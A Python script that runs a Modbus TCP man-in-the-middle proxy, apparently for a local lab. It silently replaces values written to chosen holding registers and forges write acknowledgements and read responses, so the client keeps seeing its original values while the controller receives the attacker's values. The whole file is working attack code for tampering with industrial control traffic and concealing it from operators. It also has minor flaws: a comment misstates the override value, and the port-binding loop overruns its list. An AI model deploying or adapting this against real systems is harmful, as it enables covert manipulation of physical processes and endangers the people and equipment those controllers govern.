# !/usr/bin/env python3
import socket
import struct
import threading
from datetime import datetime
from collections import defaultdict

MODBUS_TCP_PORT = 502
MITM_PORT = 2502  # Our proxy port

# Modbus function codes
FUNCTION_CODES = {
    0x01: "READ_COILS",
    0x02: "READ_DISCRETE_INPUTS",
    0x03: "READ_HOLDING_REGISTERS",
    0x04: "READ_INPUT_REGISTERS",
    0x05: "WRITE_SINGLE_COIL",
    0x06: "WRITE_SINGLE_REGISTER",
    0x0F: "WRITE_MULTIPLE_COILS",
    0x10: "WRITE_MULTIPLE_REGISTERS",
    0x16: "MASK_WRITE_REGISTER",
    0x17: "READ_WRITE_MULTIPLE_REGISTERS"
}

# Registry override storage (address -> new value)
overrides = {
    0x0002: 0x1000,  # Example: override register 2 with 0xDEAD
}

# Store original client values for response modification
client_original_values = defaultdict(dict)  # {client_addr: {register: original_value}}


def get_timestamp():
    """Return short timestamp string"""
    return datetime.now().strftime("%H:%M:%S")


def parse_modbus_request(data):
    """Parse Modbus TCP request"""
    if len(data) < 8:
        return None

    # Modbus TCP header
    transaction_id = struct.unpack('>H', data[0:2])[0]
    protocol_id = struct.unpack('>H', data[2:4])[0]
    length = struct.unpack('>H', data[4:6])[0]
    unit_id = data[6]
    function_code = data[7]

    result = {
        'transaction_id': transaction_id,
        'protocol_id': protocol_id,
        'length': length,
        'unit_id': unit_id,
        'function_code': function_code,
        'function_name': FUNCTION_CODES.get(function_code, f"UNKNOWN(0x{function_code:02X})"),
        'raw': data
    }

    # WRITE SINGLE REGISTER (06)
    if function_code == 0x06 and len(data) >= 12:
        address = struct.unpack('>H', data[8:10])[0]
        value = struct.unpack('>H', data[10:12])[0]
        result['address'] = address
        result['value'] = value
        result['is_write'] = True

    # READ HOLDING REGISTERS (03)
    elif function_code == 0x03 and len(data) >= 12:
        address = struct.unpack('>H', data[8:10])[0]
        quantity = struct.unpack('>H', data[10:12])[0]
        result['address'] = address
        result['quantity'] = quantity
        result['is_read'] = True

    return result


def build_modbus_response(request, original_value, modified_value=None):
    """Build Modbus TCP response"""
    function_code = request['function_code']

    # WRITE SINGLE REGISTER response (06)
    if function_code == 0x06:
        response = bytearray(request['raw'][:8])  # header
        response[4:6] = struct.pack('>H', 6)  # length
        response.extend(struct.pack('>H', request.get('address', 0)))

        if modified_value is not None:
            response.extend(struct.pack('>H', modified_value))
        else:
            response.extend(struct.pack('>H', original_value))

        return bytes(response)

    return None


def restore_read_response(data, request, client_addr):
    """Restore original values in READ HOLDING REGISTERS response"""
    if request['function_code'] != 0x03:
        return data

    address = request.get('address', 0)
    quantity = request.get('quantity', 0)

    if not data or len(data) < 9:  # Minimum length for read response
        return data

    byte_count = data[8]
    if byte_count != quantity * 2:
        return data

    modified = False
    modified_data = bytearray(data)

    # Check each register in response
    for i in range(quantity):
        current_addr = address + i
        if current_addr in overrides:
            # Position in response: 9 (header) + i*2
            value_pos = 9 + (i * 2)
            if value_pos + 2 <= len(data):
                # If we have original value from this client, restore it
                original_value = client_original_values.get(client_addr, {}).get(current_addr)
                if original_value is not None:
                    # Server returned our overridden value, need to restore original for client
                    modified_data[value_pos:value_pos + 2] = struct.pack('>H', original_value)
                    modified = True
                    print(f"[{get_timestamp()}] [RESTORED] Response for register {current_addr:04X}: "
                          f"sending back client's original value {original_value}")
                # Else: server returned some value, we don't have original from client, leave as is

    return bytes(modified_data) if modified else data


def handle_client(client_sock, client_addr):
    """Handle single client connection"""
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ports = list(range(25002, 25010))
    bound = False
    for i in range(32):
        try:
            server_sock.bind(('127.0.0.1', ports[i]))  # Fix source port
            bound = True
            break
        except:
            continue
    if not bound:
        raise Exception('Failed to bind to ports {}'.format(ports[i]))
    server_sock.connect(('127.0.0.1', MODBUS_TCP_PORT))

    # Initialize storage for this client
    client_original_values[client_addr] = {}

    try:
        while True:
            # Client -> Server
            try:
                data = client_sock.recv(1024)
                if not data:
                    break

                # Analyze request
                request = parse_modbus_request(data)
                if request:
                    timestamp = get_timestamp()
                    func_name = request['function_name']

                    # WRITE SINGLE REGISTER
                    if request['function_code'] == 0x06:
                        addr = request.get('address', 0)
                        value = request.get('value', 0)
                        print(f"[{timestamp}] [->] {func_name} addr=0x{addr:04X} value={value}")

                        # Store original value from client
                        client_original_values[client_addr][addr] = value

                        # Check if we need to override
                        if addr in overrides:
                            modified_data = bytearray(data)
                            modified_data[10:12] = struct.pack('>H', overrides[addr])
                            data = bytes(modified_data)

                            print(f"[{get_timestamp()}] [MITM] Overriding register {addr:04X}: "
                                  f"{value} -> {overrides[addr]}")

                    # READ HOLDING REGISTERS
                    elif request['function_code'] == 0x03:
                        addr = request.get('address', 0)
                        qty = request.get('quantity', 0)
                        print(f"[{timestamp}] [->] {func_name} addr=0x{addr:04X} count={qty}")
                    else:
                        print(f"[{timestamp}] [->] {func_name}")

                # Send (modified or original) request to server
                server_sock.send(data)

            except socket.error:
                break

            # Server -> Client
            try:
                response = server_sock.recv(1024)
                if not response:
                    break

                # Modify response based on request type
                if request:
                    # For WRITE SINGLE REGISTER response
                    if request['function_code'] == 0x06:
                        address = request.get('address', 0)
                        if address in overrides:
                            # Get original value from client to send back
                            original_value = client_original_values[client_addr].get(address)
                            if original_value is not None:
                                # Server responded with overridden value, we need to send original back to client
                                modified_response = build_modbus_response(
                                    request,
                                    struct.unpack('>H', response[10:12])[0],  # Server's response
                                    original_value  # Send back client's original value
                                )
                                if modified_response:
                                    response = modified_response
                                    print(f"[{get_timestamp()}] [RESTORED] Response for register {address:04X}: "
                                          f"sending back client's original value {original_value}")

                    # For READ HOLDING REGISTERS response
                    elif request['function_code'] == 0x03:
                        # Restore original values in read response if needed
                        response = restore_read_response(response, request, client_addr)

                client_sock.send(response)

            except socket.error:
                break

    finally:
        # Clean up client storage
        if client_addr in client_original_values:
            del client_original_values[client_addr]
        client_sock.close()
        server_sock.close()


def main():
    """Start MITM proxy"""
    print(f"[{get_timestamp()}] Modbus MITM Proxy started")
    print(f"[{get_timestamp()}] Listening on 127.0.0.1:{MITM_PORT}")
    print(f"[{get_timestamp()}] Forwarding to 127.0.0.1:{MODBUS_TCP_PORT}")
    print(f"[{get_timestamp()}] Overrides: {overrides}")
    print(f"[{get_timestamp()}] Press Ctrl+C to stop\n")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('127.0.0.1', MITM_PORT))
    server.listen(5)

    try:
        while True:
            client_sock, addr = server.accept()
            print(f"[{get_timestamp()}] [+] Connection from {addr}")
            threading.Thread(target=handle_client, args=(client_sock, str(addr))).start()
    except KeyboardInterrupt:
        print(f"\n[{get_timestamp()}] Shutting down")
    finally:
        server.close()


if __name__ == "__main__":
    main()
